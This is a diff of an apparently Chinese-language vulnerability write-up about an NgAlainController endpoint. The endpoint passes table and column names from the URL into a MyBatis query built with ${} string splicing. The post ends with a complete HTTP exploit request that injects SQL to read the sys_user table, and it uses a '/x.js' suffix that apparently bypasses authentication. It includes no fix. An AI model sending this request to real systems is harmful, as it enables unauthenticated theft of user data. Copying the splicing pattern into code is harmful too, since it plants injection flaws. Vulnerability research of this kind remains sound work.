@@ -29,9 +29,9 @@ NgAlainController当中
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVyQtLE4Y1GWBNJ7nrEiaIDIibAbic3QvhLMlN3ceOAgWOqHh0q2S7TFCPHw/640?wx_fmt=png&from=appmsg "")  
 ```
-@RequestMapping(value = "/getDictItemsByTable/{table}/{key}/{value}", method = RequestMethod.GET)
-public Object getDictItemsByTable(@PathVariable String table,@PathVariable String key,@PathVariable String value) {    
-  return this.ngAlainService.getDictByTable(table,key,value);
+@RequestMapping(value = "/getDictItemsByTable/{table}/{key}/{value}", method = RequestMethod.GET)
+public Object getDictItemsByTable(@PathVariable String table,@PathVariable String key,@PathVariable String value) {    
+  return this.ngAlainService.getDictByTable(table,key,value);
 }
 ```  
   
@@ -43,7 +43,7 @@ public Object getDictItemsByTable(@PathVariable String table,@PathVariable 
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVychp9ceM1UPdicSsFicdVKXG4LDaprRg8yEdiaJlPOBv0HR0Dpp9hywxmw/640?wx_fmt=png&from=appmsg "")  
 ```
-@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")
+@Select("select ${key} as \"label\",${value} as \"value\" from ${table}")
 ```  
   
 这里key和value可以指定任意数据库的两个字段，然后table可以指定任意数据库  
@@ -60,18 +60,18 @@ public Object getDictItemsByTable(@PathVariable String table,@PathVariable 
   
 两者结合一下就能造成未授权的SQL注入漏洞了，一般都是查sys_user这个自带表  
 ```
-GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
-Host: 
-sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
-Sec-Fetch-Dest: empty
-Accept: application/json, text/plain, */*
-Sec-Fetch-Mode: cors
-Accept-Language: zh-CN,zh;q=0.9
-Sec-Fetch-Site: same-origin
-Accept-Encoding: gzip, deflate, br, zstd
-sec-ch-ua-platform: "Windows"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
+GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
+Host: 
+sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
+Sec-Fetch-Dest: empty
+Accept: application/json, text/plain, */*
+Sec-Fetch-Mode: cors
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate, br, zstd
+sec-ch-ua-platform: "Windows"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
 ```  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSRbB9By9wT89jdfDVtIGVy7YWCW3KZAIV4Ioib1wlobbekaqEoyzkTnSkjIu05Wp0CUAnV8MMCDrQ/640?wx_fmt=png&from=appmsg "")  
